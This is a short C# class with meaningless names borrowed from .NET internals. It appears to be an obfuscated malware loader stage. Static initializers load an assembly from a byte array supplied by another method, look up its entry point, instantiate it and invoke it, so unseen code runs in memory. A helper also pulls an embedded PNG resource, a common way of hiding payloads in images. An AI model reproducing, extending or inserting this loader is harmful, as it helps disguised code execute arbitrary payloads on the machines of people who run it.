using System.Drawing;
using System.IO;
using System.Reflection;

public class CodeTryCatchFinallyStatement
{
	public static Assembly open = Assembly.Load(MethodSignatureEnum.GCLargeObjectHeapCompactionMode());

	public static MethodInfo mentry = Assembly.Load(MethodSignatureEnum.GCLargeObjectHeapCompactionMode()).EntryPoint;

	public static object WriteProcessingInstructionAsyncd__139(Assembly assembly, MethodInfo entryPoint)
	{
		return assembly.CreateInstance(TOKENBINDING_IDENTIFIER(entryPoint));
	}

	public static void XmlSubtreeReader(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(WriteProcessingInstructionAsyncd__139(assembly, entryPoint), null);
	}

	public static string TOKENBINDING_IDENTIFIER(MethodInfo entryPoint)
	{
		return (string)DbParameter(entryPoint);
	}

	public static void SoapToken()
	{
		FtpStyleUriParser();
	}

	internal static object DbParameter(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	internal static bool FtpStyleUriParser()
	{
		XmlSubtreeReader(open, mentry);
		return true;
	}

	internal static bool c__DisplayClass35_0()
	{
		return false;
	}

	public static Image getResourceImg(Assembly asm)
	{
		using (Stream stream = asm.GetManifestResourceStream("ISecurityEncodable.png"))
		{
			if (stream != null)
			{
				return Image.FromStream(stream);
			}
		}
		return null;
	}
}
